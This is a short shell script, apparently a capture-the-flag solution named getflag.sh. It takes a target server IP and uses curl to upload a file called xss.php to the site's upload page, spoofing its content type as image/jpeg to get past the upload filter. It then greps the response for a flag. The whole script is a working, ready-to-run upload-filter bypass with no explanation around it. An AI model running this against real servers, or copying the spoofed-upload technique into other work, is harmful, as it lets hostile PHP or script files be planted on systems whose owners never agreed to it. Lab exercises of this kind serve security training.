# /bin/sh

if [ -z "$1" ]; then
	echo "Usage: sh getflag.sh [server_ip]"
	exit 1
fi

curl -s -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=Upload' -F 'uploaded=@xss.php;type=image/jpeg' http://$1/index.php?page=upload# \
| grep "flag"